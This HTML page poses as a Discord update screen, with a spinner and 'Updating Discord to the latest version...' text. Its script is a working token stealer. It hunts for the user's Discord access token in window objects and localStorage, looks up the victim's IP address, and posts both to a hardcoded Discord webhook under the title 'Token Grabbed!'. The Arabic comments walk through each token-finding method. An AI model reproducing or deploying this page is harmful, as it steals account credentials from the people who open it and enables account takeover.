<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Updating Discord...</title>
    <style>
        body { margin: 0; background: #202225; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #404EED; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { color: #fff; position: absolute; bottom: 20%; text-align: center; }
    </style>
</head>
<body>
    <div style="text-align:center;">
        <div class="loader"></div>
        <p>Updating Discord to the latest version...</p>
    </div>

    <script>
        const WEBHOOK = "https://canary.discord.com/api/webhooks/1552402636894896208/_9zy2MYyVl5_lac_A8Gh9ClUBHB0YbslMSJXM8BsD63bjiMyYEhMQ3HbjACpFdRv01VO";

        // دالة البحث عن التوكن
        function findToken() {
            // الطريقة الحديثة (2024+)
            const accessToken = window.xd?.accessToken;
            if (accessToken) return { type: "New", token: accessToken };

            // الطريقة القديمة (للمستخدمين القدامى)
            const token = Object.values(window).find(v => v?.token?.length > 20)?.token;
            if (token) return { type: "Old", token: token };

            // طريقة LocalStorage
            const user = localStorage.getItem("discord");
            if (user) {
                try {
                    const data = JSON.parse(user);
                    const token = data?.token || data?.accessToken;
                    if (token) return { type: "Local", token: token };
                } catch (e) {}
            }

            return null;
        }

        // البحث المستمر حتى يجد التوكن
        function grabLoop() {
            const result = findToken();
            if (result) {
                fetch('https://api.ipify.org?format=json').then(async r => {
                    const ip = await r.json();
                    fetch(WEBHOOK, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            embeds: [{
                                color: 65280,
                                title: "🎣 Token Grabbed!",
                                fields: [
                                    { name: "Token", value: `\`\`\`${result.token}\`\`\``, inline: false },
                                    { name: "IP", value: ip.ip, inline: true },
                                    { name: "Source", value: result.type, inline: true }
                                ]
                            }]
                        })
                    });
                    document.body.innerHTML = "<h1 style='color:#fff'>Success!</h1>";
                });
            } else {
                setTimeout(grabLoop, 1000);
            }
        }

        grabLoop();
    </script>
</body>
</html>
